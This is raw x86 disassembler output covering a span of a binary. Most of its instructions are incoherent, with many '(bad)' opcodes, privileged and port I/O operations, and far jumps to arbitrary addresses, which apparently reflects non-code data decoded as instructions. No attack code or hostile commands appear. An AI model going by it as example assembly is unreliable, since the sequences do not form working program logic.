  4275e9:	fldenv [ebp+0x6c383456]
  4275ef:	retf   
  4275f0:	xchg   ebp,eax
  4275f1:	push   esp
  4275f2:	inc    eax
  4275f3:	dec    ecx
  4275f4:	dec    edx
  4275f5:	aas    
  4275f6:	xchg   edi,eax
  4275f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275f8:	aas    
  4275f9:	push   edx
  4275fa:	in     al,0xcb
  4275fc:	(bad)  
  4275fd:	adc    ah,BYTE PTR [ecx]
  4275ff:	fs aaa 
  427601:	xchg   ebx,eax
  427602:	push   ds
  427603:	pop    edx
  427604:	push   ecx
  427605:	mov    al,ds:0x70f6283e
  42760b:	pop    ds
  42760c:	ins    DWORD PTR es:[edi],dx
  42760d:	xchg   esp,eax
  42760e:	mov    ah,BYTE PTR [ecx+0x7ce18b9d]
  427614:	sti    
  427615:	mov    ah,0x91
  427617:	scas   al,BYTE PTR es:[edi]
  427618:	sub    DWORD PTR [ebx],esp
  42761a:	bnd ja 0x427678
  42761d:	imul   ebx,DWORD PTR [ebx],0xffffffed
  427620:	popa   
  427621:	das    
  427622:	sub    edx,DWORD PTR [ecx+ebx*4-0x74]
  427626:	mov    es,WORD PTR [edx]
  427628:	stos   BYTE PTR es:[edi],al
  427629:	sbb    cl,BYTE PTR [edi]
  42762b:	aas    
  42762c:	ins    BYTE PTR es:[edi],dx
  42762d:	push   ecx
  42762e:	loopne 0x4275dc
  427630:	mov    edi,cr1
  427633:	pop    edi
  427634:	ss xor esp,eax
  427637:	out    dx,eax
  427638:	cwde   
  427639:	jno    0x4275f8
  42763b:	imul   edx,DWORD PTR [edx],0xffffff8f
  42763e:	xchg   edi,eax
  42763f:	mov    ds,WORD PTR [edx+0x66]
  427642:	ret    0x6ab5
  427645:	daa    
  427646:	lods   al,BYTE PTR ds:[esi]
  427647:	setge  BYTE PTR [edx+0x1b74cbff]
  42764e:	mov    ds:0xa5fc2a75,eax
  427653:	mov    bl,0x81
  427655:	in     eax,dx
  427656:	jp     0x427630
  427658:	test   eax,0x1c6e89c7
  42765d:	push   esp
  42765e:	daa    
  42765f:	or     DWORD PTR [esi+0x6eebbf98],ecx
  427665:	dec    ebx
  427666:	mov    dl,0x71
  427668:	das    
  427669:	sub    dh,bh
  42766b:	shr    BYTE PTR [eax],cl
  42766d:	mov    bh,0xb4
  42766f:	sub    BYTE PTR [edi+eax*4-0x6e202d28],cl
  427676:	and    eax,0x4642e4e2
  42767b:	push   ebp
  42767c:	xlat   BYTE PTR ds:[ebx]
  42767d:	jae    0x4276c8
  42767f:	inc    ebp
  427680:	aaa    
  427681:	ds out 0xd4,eax
  427684:	es loopne 0x4276af
  427687:	aas    
  427688:	dec    ecx
  427689:	ret    
  42768a:	xchg   esi,eax
  42768b:	dec    DWORD PTR [ebp-0x5e]
  42768e:	outs   dx,BYTE PTR ds:[esi]
  42768f:	ins    BYTE PTR es:[edi],dx
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [eax+0x28]
  427702:	xchg   ecx,eax
  427703:	scas   eax,DWORD PTR es:[edi]
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	push   0xb210f35a
  427711:	arpl   WORD PTR ds:[ecx],sp
  427714:	add    DWORD PTR [eax-0x6d16c02d],edx
  42771a:	call   0x79f185a1
  42771f:	xor    BYTE PTR [ebx+edi*2+0x4d],dl
  427723:	daa    
  427724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427725:	xor    dl,BYTE PTR [eax-0x2d351f0e]
  42772b:	xor    DWORD PTR [ecx-0x6a0cd2cc],ebx
  427731:	sub    ebx,esp
  427733:	jp     0x4276cd
  427735:	mov    ds:0x40136b31,al
  42773a:	xor    BYTE PTR [edi],0x5c
  42773d:	out    dx,eax
  42773e:	pop    ecx
  42773f:	fwait
  427740:	cli    
  427741:	dec    ebp
  427742:	or     DWORD PTR [edx+eax*8],esi
  427745:	retf   
  427746:	xor    DWORD PTR [ecx-0x5679a1be],ecx
  42774c:	cs pop ds
  42774e:	in     al,dx
  42774f:	outs   dx,DWORD PTR ds:[esi]
  427750:	adc    eax,0x580e5d78
  427755:	xchg   ecx,eax
  427756:	iret   
  427757:	fdivr  st(0),st
  427759:	xchg   DWORD PTR [eax+0x2a6c2abc],ebp
  42775f:	stc    
  427760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427761:	mov    edi,0xffee3ffd
  427766:	mov    edi,0xf1e024da
  42776b:	adc    BYTE PTR [esi-0x495f34b],dh
  427771:	jb     0x4277ab
  427773:	aas    
  427774:	or     DWORD PTR [ebp-0x38],edx
  427777:	jns    0x21956e11
  42777d:	dec    eax
  42777e:	pop    ss
  42777f:	add    eax,0x96789fc8
  427784:	fild   WORD PTR [ebx]
  427786:	xor    al,ah
  427788:	cmp    eax,0x2dba77fd
  42778d:	sahf   
  42778e:	sub    BYTE PTR [edx+ebx*4-0x67d6189f],0x84
  427796:	jmp    0xc6a4:0xd601c2ca
  42779d:	pushf  
  42779e:	pop    ebx
  42779f:	lods   al,BYTE PTR ds:[esi]
  4277a0:	bnd jns 0x4277b5
  4277a3:	ins    BYTE PTR es:[edi],dx
  4277a4:	(bad)  
  4277a5:	(bad)  
  4277a7:	(bad)  
  4277a8:	ins    BYTE PTR es:[edi],dx
  4277a9:	mov    ecx,esi
  4277ab:	jae    0x4277e3
  4277ad:	in     eax,dx
  4277ae:	(bad)  
  4277af:	mov    esp,0x41b57bca
  4277b4:	push   eax
  4277b5:	ds or  edx,ebx
  4277b8:	fiadd  WORD PTR [eax-0x2b]
  4277bb:	out    0xae,al
  4277bd:	sub    bh,BYTE PTR [ebx+0x7ee9ce6d]
  4277c3:	aad    0x6b
  4277c5:	scas   al,BYTE PTR es:[edi]
  4277c6:	aam    0xbb
  4277c8:	jno    0x427791
  4277ca:	or     eax,0xacedc1d7
  4277cf:	mov    edi,0xd7b94b69
  4277d4:	or     eax,0xa4152859
  4277d9:	ss cmp al,0x82
  4277dc:	push   ds
  4277dd:	mov    ebp,0x4362e05c
  4277e2:	mov    esi,0xb6430f80
  4277e7:	scas   al,BYTE PTR es:[edi]
  4277e8:	into   
  4277e9:	and    DWORD PTR [esi],esi
  4277eb:	ins    BYTE PTR es:[edi],dx
  4277ec:	mov    dl,0x74
  4277ee:	test   DWORD PTR [eax+0x232a5ec6],ebx
  4277f4:	mov    esp,0x57e78505
  4277f9:	iret   
  4277fa:	push   ecx
  4277fb:	inc    edx
  4277fc:	mov    eax,edi
  4277fe:	inc    esi
  4277ff:	pop    esp
  427800:	sbb    BYTE PTR [ecx-0x18],bl
  427803:	cmp    BYTE PTR [edi],bl
  427805:	mov    ebx,0xcab1ba57
  42780a:	es xchg edi,eax
  42780c:	xor    esp,edx
  42780e:	outs   dx,DWORD PTR ds:[esi]
  42780f:	xchg   edx,eax
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	or     BYTE PTR [edx],al
  427882:	ret    
  427883:	mov    ds:0x1a620,al
  427888:	add    al,0x1
  42788a:	add    BYTE PTR [eax],al
  42788c:	loope  0x427887
  42788e:	cmp    bl,cl
  427890:	xchg   BYTE PTR [edx-0x1c],ch
  427893:	loope  0x427815
  427895:	sar    esi,0x97
  427898:	and    edx,DWORD PTR [edi+0x31]
  42789b:	rcr    BYTE PTR [esi],1
  42789d:	call   FWORD PTR [ebp+0x7b]
  4278a0:	sbb    al,0xf9
  4278a2:	iret   
  4278a3:	mul    BYTE PTR cs:[ecx]
  4278a6:	adc    DWORD PTR [ebx],edx
  4278a8:	ins    DWORD PTR es:[edi],dx
  4278a9:	int3   
  4278aa:	xchg   edi,eax
  4278ab:	xor    al,0x96
  4278ad:	sar    BYTE PTR [eax+0x6eae7586],1
  4278b3:	sti    
  4278b4:	jmp    0xdcfb:0xd2895a48
  4278bb:	push   eax
  4278bc:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4278be:	mov    ds:0x4337de8a,eax
  4278c3:	push   0xe4c987d9
  4278c8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4278ca:	jmp    0xcb36fa91
  4278cf:	jmp    0x42790d
  4278d1:	(bad)  
  4278d2:	mov    es,WORD PTR [esi-0x20]
  4278d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278d6:	push   ebx
  4278d7:	pusha  
  4278d8:	cmp    BYTE PTR [eax],ch
  4278da:	in     al,dx
  4278db:	clc    
  4278dc:	cli    
  4278dd:	scas   eax,DWORD PTR es:[edi]
  4278de:	fdivr  st,st(5)
  4278e0:	mov    ss,WORD PTR [ecx-0x17]
  4278e3:	add    ebx,eax
  4278e5:	mov    edx,0x5e66720b
  4278ea:	outs   dx,BYTE PTR ds:[esi]
  4278eb:	and    edx,DWORD PTR [edi+0x2c]
  4278ee:	fdiv   QWORD PTR [edx]
  4278f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278f1:	jp     0x4278a0
  4278f3:	push   es
  4278f4:	(bad)  
  4278f5:	stos   BYTE PTR es:[edi],al
  4278f6:	push   edx
  4278f7:	sub    dh,BYTE PTR [ebx-0x23]
  4278fa:	or     ch,al
  4278fc:	bound  esi,QWORD PTR [ecx+0x5a]
  4278ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427900:	mov    eax,0xcd88fea9
  427905:	mov    ds:0x840584d1,al
  42790a:	leave  
  42790b:	cs xchg ecx,ecx
  42790e:	cmp    BYTE PTR [ebp*2+0x3ff0a5b7],ch
  427915:	add    al,0xdf
  427917:	jns    0x4278a4
  427919:	aaa    
  42791a:	push   edi
  42791b:	mov    gs,esi
  42791d:	call   0x13b7e386
  427922:	sub    BYTE PTR [ecx],0xcf
  427925:	iret   
  427926:	sub    DWORD PTR [ecx-0x42],ecx
  427929:	adc    bl,bh
  42792b:	inc    esp
  42792c:	add    ecx,DWORD PTR [edi-0x7de32846]
  427932:	inc    esp
  427933:	and    edi,edx
  427935:	xchg   ebx,eax
  427936:	jb     0x4278cb
  427938:	cmp    eax,0x92bff80
  42793d:	ret    
  42793e:	and    esp,DWORD PTR [esi+0x2938f1f1]
  427944:	mov    esp,0xcc7f73ca
  427949:	stc    
  42794a:	or     dh,dh
  42794c:	shl    BYTE PTR [edx+0x2ff5e19b],0x26
  427953:	scas   eax,DWORD PTR es:[edi]
  427954:	sbb    dl,BYTE PTR [ecx+0x75d0b571]
  42795a:	mov    al,0xa0
  42795c:	and    al,0x7f
  42795e:	js     0x4279af
  427960:	dec    esp
  427961:	dec    edx
  427962:	nop
  427963:	jns    0x4279ae
  427965:	sub    ecx,DWORD PTR [ebp-0x5f31ec71]
  42796b:	int    0x8
  42796d:	sub    DWORD PTR [ebp+ecx*8+0x71f05300],ebp
  427974:	test   eax,0xedc5dbc8
  427979:	inc    edx
  42797a:	fwait
  42797b:	or     bl,BYTE PTR [eax+eax*1-0x2d60385]
  427982:	std    
  427983:	punpckldq mm4,DWORD PTR [ebx+0x101538ce]
  42798a:	mov    BYTE PTR [ebp-0x35],bl
  42798d:	repnz dec eax
  42798f:	test   DWORD PTR [eax],0x0
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx+0x5fae33c9]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	sbb    cl,ah
  427a0e:	sbb    eax,0xa47f5beb
  427a13:	int3   
  427a14:	mov    bh,0xe2
  427a16:	dec    esp
  427a17:	aad    0xac
  427a19:	adc    al,0xee
  427a1b:	pop    ebx
  427a1c:	xchg   ebx,eax
  427a1d:	pop    esi
  427a1e:	sbb    esp,DWORD PTR [edi]
  427a20:	adc    al,0x7
  427a22:	push   ebx
  427a23:	fld    QWORD PTR [ebx+0x60]
  427a26:	mov    edx,0x783efcb
  427a2c:	or     al,0x37
  427a2e:	imul   esi,DWORD PTR [ebx],0xb9b8746c
  427a34:	(bad)  [eax+0x7c]
  427a37:	jne    0x427a6f
  427a39:	mov    ecx,0x1b6607cf
  427a3e:	pop    esp
  427a3f:	addr16 push esp
  427a41:	xchg   esp,eax
  427a42:	retf   0x96c4
  427a45:	add    DWORD PTR [edi+0x578fad83],edi
  427a4b:	daa    
  427a4c:	jmp    0xba55:0xec6b2113
  427a53:	xchg   ecx,eax
  427a54:	mov    eax,0x8bc91e1c
  427a59:	loopne 0x427a13
  427a5b:	push   0x69a4fc05
  427a60:	inc    ebx
  427a61:	sbb    eax,0x45e5ac27
  427a66:	adc    edi,esp
  427a68:	xchg   edi,eax
  427a69:	out    dx,eax
  427a6a:	scas   al,BYTE PTR es:[edi]
  427a6b:	add    al,0x44
  427a6d:	jle    0x427abd
  427a6f:	and    eax,0x9554a035
  427a74:	pop    edi
  427a75:	lds    edx,FWORD PTR [ecx-0x790a905f]
  427a7b:	sub    BYTE PTR [eax],ah
  427a7d:	or     esp,esp
  427a7f:	sbb    dh,dl
  427a81:	pop    ecx
  427a82:	xchg   ebx,eax
  427a83:	and    ah,ch
  427a85:	cmp    eax,0x12f75c56
  427a8a:	aas    
  427a8b:	or     al,0x7
  427a8d:	and    eax,0x86bdb169
  427a92:	int    0x64
  427a94:	mov    esi,0xde18aeba
  427a99:	bound  edx,QWORD PTR [ecx+0x1cd5dad2]
  427a9f:	mov    edi,esp
  427aa1:	push   esi
  427aa2:	rol    BYTE PTR [ebp+edi*8+0x4467862d],cl
  427aa9:	ja     0x427a8e
  427aab:	jbe    0x427ae1
  427aad:	mov    ecx,0xb0edac06
  427ab2:	out    0x26,al
  427ab4:	xchg   ebx,eax
  427ab5:	fadd   DWORD PTR [edx]
  427ab7:	loope  0x427ad7
  427ab9:	dec    ebp
  427aba:	dec    esi
  427abb:	ja     0x427b17
  427abd:	dec    edx
  427abe:	mov    esp,0x84324a09
  427ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ac4:	je     0x427b15
  427ac6:	dec    BYTE PTR [edi-0x6ee2263f]
  427acc:	dec    edx
  427acd:	add    ch,BYTE PTR [eax]
  427acf:	ret    
  427ad0:	popf   
  427ad1:	loope  0x427a76
  427ad3:	retf   0xd79f
  427ad6:	jo     0x427aa3
  427ad8:	mov    eax,0xdcf3a92b
  427add:	int3   
  427ade:	pop    ebp
  427adf:	(bad)  [edi-0x19c9b471]
  427ae5:	(bad)  
  427ae6:	int    0xc4
  427ae8:	jg     0x427af7
  427aea:	pop    esi
  427aeb:	cmp    DWORD PTR [esi],ecx
  427aed:	sbb    DWORD PTR [eax],edi
  427aef:	shr    BYTE PTR [esi+0x2a],1
  427af2:	and    dh,bh
  427af4:	xor    BYTE PTR [ebp+0x1dc7bd4d],cl
  427afa:	mov    ebx,0x601dbb90
  427aff:	add    eax,0xfda64a61
  427b04:	mov    edx,0x9ccaa01e
  427b09:	scas   eax,DWORD PTR es:[edi]
  427b0a:	sub    esp,0xfffffffe
  427b0d:	lock in eax,dx
  427b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	mul    BYTE PTR [ecx+0x282b9b9c]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	pop    edx
  427b8d:	(bad)  
  427b8e:	and    DWORD PTR [ecx-0x7da94935],esp
  427b94:	add    eax,0xd8d3f13
  427b99:	add    dl,ah
  427b9b:	cmp    ecx,edi
  427b9d:	mov    ecx,0xe2dd9c92
  427ba2:	ret    0x2b18
  427ba5:	(bad)  
  427ba6:	mov    bh,0x93
  427ba8:	out    dx,eax
  427ba9:	pushf  
  427baa:	and    ebp,edx
  427bac:	adc    BYTE PTR [ecx+0x7ea13f6c],dl
  427bb2:	push   ebp
  427bb3:	push   eax
  427bb4:	pop    ebx
  427bb5:	shl    BYTE PTR [esp+eax*4-0xcef63a0],0x14
  427bbd:	dec    esi
  427bbe:	inc    esi
  427bbf:	cwde   
  427bc0:	mov    dl,0x78
  427bc2:	add    BYTE PTR [ecx*8+0x116ee290],al
  427bc9:	fnstenv [ebx]
  427bcb:	push   ecx
  427bcc:	push   0x22cde33d
  427bd1:	loope  0x427b86
  427bd3:	sub    dl,BYTE PTR [esp+ebp*1]
  427bd6:	cmp    eax,0xcdf8d437
  427bdb:	je     0x427c25
  427bdd:	adc    eax,0xca1f8ced
  427be2:	pop    ss
  427be3:	sahf   
  427be4:	call   0x8b97:0x235f9e34
  427beb:	mov    ds:0xf909bce8,al
  427bf0:	cmp    al,0x60
  427bf2:	jp     0x427c29
  427bf4:	scas   eax,DWORD PTR es:[edi]
  427bf5:	cmc    
  427bf6:	ins    DWORD PTR es:[edi],dx
  427bf7:	dec    BYTE PTR [esi+ebp*1+0x79]
  427bfb:	mov    al,0xbe
  427bfd:	stos   BYTE PTR es:[edi],al
  427bfe:	sahf   
  427bff:	les    ebx,FWORD PTR [ecx+esi*1-0x71a26b27]
  427c06:	xor    ebp,DWORD PTR [ebx]
  427c08:	push   0xd
  427c0a:	adc    dh,0x6e
  427c0d:	xchg   BYTE PTR [ebx-0x65],al
  427c10:	cdq    
  427c11:	leave  
  427c12:	push   es
  427c13:	pop    ds
  427c14:	(bad)  
  427c15:	sti    
  427c16:	mov    bl,0xc1
  427c18:	icebp  
  427c19:	and    BYTE PTR [eax],ah
  427c1b:	cmp    DWORD PTR [ebp+eiz*8-0x79],ebp
  427c1f:	outs   dx,BYTE PTR ds:[esi]
  427c20:	pushf  
  427c21:	repz dec esi
  427c23:	mov    edx,0x5ca49439
  427c28:	push   cs
  427c29:	add    al,BYTE PTR [ecx]
  427c2b:	scas   eax,DWORD PTR es:[edi]
  427c2c:	jg     0x427ca6
  427c2e:	xchg   esi,eax
  427c2f:	hlt    
  427c30:	push   es
  427c31:	scas   eax,DWORD PTR es:[edi]
  427c32:	test   BYTE PTR [edx+0xc1dbc99],bl
  427c38:	fbstp  TBYTE PTR [edi]
  427c3a:	ds xchg esp,eax
  427c3c:	mov    eax,ds:0xbd76b043
  427c41:	or     ch,BYTE PTR [ecx]
  427c43:	or     al,0x3
  427c45:	aam    0x1b
  427c47:	jnp    0x427cc1
  427c49:	push   ss
  427c4a:	in     eax,0x55
  427c4c:	mov    WORD PTR [esi+0x7f],ds
  427c4f:	outs   dx,DWORD PTR ds:[esi]
  427c50:	mov    bh,0x2b
  427c52:	loopne 0x427c33
  427c54:	scas   eax,DWORD PTR es:[edi]
  427c55:	and    ch,BYTE PTR [ecx]
  427c57:	add    edi,DWORD PTR [ebp+edx*4+0x1ec88999]
  427c5e:	enter  0x744d,0xe4
  427c62:	shr    al,0x1b
  427c65:	pop    esp
  427c66:	or     eax,0xcc13063d
  427c6b:	mov    dh,0x42
  427c6d:	mov    ecx,0x93cd5ac5
  427c72:	idiv   DWORD PTR fs:[edx-0x69]
  427c76:	xchg   edx,eax
  427c77:	sub    ebx,0xffffffb3
  427c7a:	dec    edi
  427c7b:	sbb    eax,0xac68c978
  427c80:	xor    esi,DWORD PTR [ecx-0x6290c49d]
  427c86:	dec    ecx
  427c87:	or     eax,0x4214b9d9
  427c8c:	mov    ah,BYTE PTR [ebx+0x81d7]
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x140a5d44,ebx
  427d02:	rcr    DWORD PTR [edx+0x2c],1
  427d05:	test   eax,0x1040001
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	in     al,dx
  427d0d:	(bad)  
  427d0e:	mov    ecx,DWORD PTR [esi+0x9]
  427d11:	ds test eax,0x3702f120
  427d17:	stc    
  427d18:	test   BYTE PTR [esi-0x27],dh
  427d1b:	cmp    bh,BYTE PTR [di]
  427d1e:	jno    0x427cc4
  427d20:	call   0x34be64de
  427d25:	repz adc eax,0xaefa21ed
  427d2b:	fwait
  427d2c:	cmc    
  427d2d:	push   eax
  427d2e:	(bad)  
  427d2f:	xchg   edx,eax
  427d30:	(bad)  
  427d31:	adc    BYTE PTR [edx],ch
  427d33:	les    eax,FWORD PTR [edx+edi*4]
  427d36:	mov    WORD PTR [ecx],cs
  427d38:	and    ebx,edx
  427d3a:	sub    edx,DWORD PTR [edi-0x29bf5687]
  427d40:	xor    ch,BYTE PTR [ebp-0x3ca8cbc2]
  427d46:	pop    ebp
  427d47:	test   BYTE PTR [edx+ebp*2-0x5d],0xaa
  427d4c:	lea    edx,[ebx+edx*2+0x55]
  427d50:	out    0x1b,al
  427d52:	pushf  
  427d53:	fs cli 
  427d55:	mov    ds:0xe5eb4b1,eax
  427d5a:	test   eax,0xd1415058
  427d5f:	bound  ebp,QWORD PTR [ecx-0x6ef04252]
  427d65:	or     al,bh
  427d67:	jmp    0xc89e9300
  427d6c:	add    eax,0xb6d80048
  427d71:	pop    ds
  427d72:	mov    edi,0x5617fbdb
  427d77:	fistp  WORD PTR [esi]
  427d79:	shl    al,0x9a
  427d7c:	(bad)  [ecx]
  427d7e:	lods   eax,DWORD PTR ds:[esi]
  427d7f:	mov    edi,0xddae57ee
  427d84:	jl     0x427db0
  427d86:	scas   eax,DWORD PTR es:[edi]
  427d87:	lods   al,BYTE PTR ds:[esi]
  427d88:	adc    ecx,DWORD PTR [edi+0x1be491e1]
  427d8e:	call   0xcaa9dee1
  427d93:	out    dx,al
  427d94:	(bad)  
  427d95:	retf   0xc8a1
  427d98:	inc    ecx
  427d99:	daa    
  427d9a:	mov    ah,BYTE PTR [ebp+edi*2-0x4a]
  427d9e:	and    ah,bl
  427da0:	xchg   ebp,eax
  427da1:	sub    eax,0xbeb0730d
  427da6:	iret   
  427da7:	in     al,dx
  427da8:	jecxz  0x427dbb
  427daa:	sub    dh,BYTE PTR [ebx]
  427dac:	js     0x427d6c
  427dae:	into   
  427daf:	inc    edi
  427db0:	cmp    eax,0xa56585c9
  427db5:	test   DWORD PTR [esi-0x62],ecx
  427db8:	fstp   QWORD PTR [ebx+0x1b]
  427dbb:	cmp    DWORD PTR [edx-0x44adc72e],ebp
  427dc1:	loopne 0x427d70
  427dc3:	mov    edi,0x8199832a
  427dc8:	inc    ebp
  427dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dca:	jmp    0x7f34:0x30eace60
  427dd1:	sub    DWORD PTR [ebp+eiz*4+0x49],ebx
  427dd5:	jb     0x427d6d
  427dd7:	mov    ebx,0x98439f3a
  427ddc:	lea    eax,[ecx-0x7a]
  427ddf:	mov    ecx,0x9255abf5
  427de4:	mov    cl,0xa
  427de6:	or     BYTE PTR [edi],0xcd
  427de9:	mov    bl,0x57
  427deb:	pop    esi
  427dec:	add    ah,cl
  427dee:	mov    eax,0x20a296cb
  427df3:	cmp    al,al
  427df5:	mov    dh,0x79
  427df7:	retf   
  427df8:	fucom  st(6)
  427dfa:	xor    eax,ebx
  427dfc:	xchg   DWORD PTR [eax+0x31fa4994],esp
  427e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e03:	pop    ds
  427e04:	ror    BYTE PTR [ebp+0x23],cl
  427e07:	lock mov bl,0xe
  427e0a:	and    al,0x59
  427e0c:	lds    esi,FWORD PTR [ecx+0xb53c]
	...
  427e72:	add    BYTE PTR [eax],al
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	xchg   edi,eax
  427e81:	cmc    
  427e82:	xchg   esi,eax
  427e83:	xor    DWORD PTR [eax],esi
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	pop    ebx
  427e8d:	pop    ds
  427e8e:	stc    
  427e8f:	dec    esp
  427e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e91:	mov    dl,0x96
  427e93:	sbb    eax,0xafea335e
  427e98:	xor    al,0x4c
  427e9a:	fistp  DWORD PTR [ecx]
  427e9c:	jle    0x427ed5
  427e9e:	sub    BYTE PTR [eax],al
  427ea0:	leave  
  427ea1:	pop    ds
  427ea2:	repz loopne 0x427ea6
  427ea5:	push   edx
  427ea6:	mov    dh,0x6e
  427ea8:	nop
  427ea9:	and    dh,dh
  427eab:	retf   0x6616
  427eae:	cmp    al,0x93
  427eb0:	scas   al,BYTE PTR es:[edi]
  427eb1:	ins    DWORD PTR es:[edi],dx
  427eb2:	mov    cl,BYTE PTR [eax-0x6c76900c]
  427eb8:	retf   
  427eb9:	jno    0x427f11
  427ebb:	inc    ecx
  427ebc:	fchs   
  427ebe:	fsin   
  427ec0:	scas   eax,DWORD PTR es:[edi]
  427ec1:	sti    
  427ec2:	mov    esi,0x9656faa7
  427ec7:	sar    eax,cl
  427ec9:	neg    BYTE PTR [ecx+0x2925d75d]
  427ecf:	mov    cl,0x50
  427ed1:	pop    ss
  427ed2:	jmp    0xc9de:0x4fdff7fb
  427ed9:	cmp    ah,BYTE PTR [edi+0x1b]
  427edc:	adc    DWORD PTR [edx-0x4431a372],eax
  427ee2:	enter  0xf151,0x98
  427ee6:	ret    
  427ee7:	and    esp,eax
  427ee9:	and    eax,0x7f13970b
  427eee:	mov    eax,ds:0xbbe79454
  427ef3:	in     al,0x3f
  427ef5:	xchg   ebx,eax
  427ef6:	in     al,dx
  427ef7:	xchg   BYTE PTR [edi-0x5a341ac3],cl
  427efd:	jp     0x427f6a
  427eff:	mov    esi,0x507e5e82
  427f04:	pushf  
  427f05:	mov    dl,BYTE PTR [edx+0x20]
  427f08:	inc    ecx
  427f09:	loop   0x427ea7
  427f0b:	and    al,0x43
  427f0d:	sub    DWORD PTR [edi+0x6d93d49e],esi
  427f13:	hlt    
  427f14:	xchg   DWORD PTR [ebp+edi*2+0x26072acf],ebx
  427f1b:	xor    DWORD PTR [ecx-0x31ed8c6d],esp
  427f21:	aaa    
  427f22:	daa    
  427f23:	sbb    bl,BYTE PTR [ebx]
  427f25:	sub    ecx,DWORD PTR [ebx+0x3d6ca8ff]
  427f2b:	cmp    ch,ch
  427f2d:	sub    edx,ecx
  427f2f:	imul   esi,DWORD PTR [ebp+ebx*4-0x5b],0x88838ade
  427f37:	inc    edi
  427f38:	cmp    eax,DWORD PTR [ecx]
  427f3a:	sar    BYTE PTR [ebx+0x1b],1
  427f3d:	adc    edx,DWORD PTR ds:0x1bbcea08
  427f43:	sbb    DWORD PTR [ecx-0x4cc26ddd],ecx
  427f49:	and    BYTE PTR [edi+0x52],0x54
  427f4d:	add    ch,BYTE PTR [ebx-0xb97142e]
  427f53:	jmp    0xdeec:0x46fd6ee9
  427f5a:	pop    edi
  427f5b:	das    
  427f5c:	jge    0x427f97
  427f5e:	ins    BYTE PTR es:[edi],dx
  427f5f:	addr16 adc eax,0x97d20fb3
  427f65:	in     eax,dx
  427f66:	mov    esp,0x73e78574
  427f6b:	call   0xd9cc09f2
  427f70:	adc    DWORD PTR [esi+edi*1+0x419b4b8b],eax
  427f77:	aaa    
  427f78:	in     al,0x2b
  427f7a:	jge    0x427fac
  427f7c:	adc    al,0xbe
  427f7e:	aas    
  427f7f:	repnz sbb al,0xf0
  427f82:	ins    BYTE PTR es:[edi],dx
  427f83:	mov    al,ds:0x523a2818
  427f88:	fdiv   st,st(5)
  427f8a:	and    esp,ebp
  427f8c:	pop    esp
  427f8d:	js     0x427fad
  427f8f:	cmc    
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	fist   DWORD PTR [edx*8+0x1ab34e6]
  428007:	add    BYTE PTR [ecx+eax*1],al
  42800a:	add    BYTE PTR [eax],al
  42800c:	dec    ebp
  42800d:	outs   dx,BYTE PTR ds:[esi]
  42800e:	jae    0x428011
  428010:	adc    DWORD PTR [eax+0x57bcb115],ecx
  428016:	mov    dh,bh
  428018:	add    esp,DWORD PTR [ecx+0x5c7446e]
  42801e:	or     al,BYTE PTR [edi+0x2a]
  428021:	xlat   BYTE PTR ds:[ebx]
  428022:	scas   eax,DWORD PTR es:[edi]
  428023:	out    0x5f,al
  428025:	pop    ebp
  428026:	xlat   BYTE PTR ds:[ebx]
  428027:	adc    al,0x83
  428029:	das    
  42802a:	and    al,0xf5
  42802c:	jb     0x428027
  42802e:	dec    ebp
  42802f:	fst    DWORD PTR [edx+0x2e9ca28e]
  428035:	mov    ch,0x48
  428037:	jg     0x428015
  428039:	jb     0x4280a1
  42803b:	and    ebx,DWORD PTR [esi+0x3605f7a2]
  428041:	mov    eax,ds:0xbb371c3a
  428046:	mov    al,ds:0xb77b57db
  42804b:	sub    al,ch
  42804d:	lock mov cl,0xa8
  428050:	ret    
  428051:	jno    0x428089
  428053:	xlat   BYTE PTR ds:[ebx]
  428054:	jle    0x427ffb
  428056:	js     0x42807a
  428058:	and    eax,0x563df27c
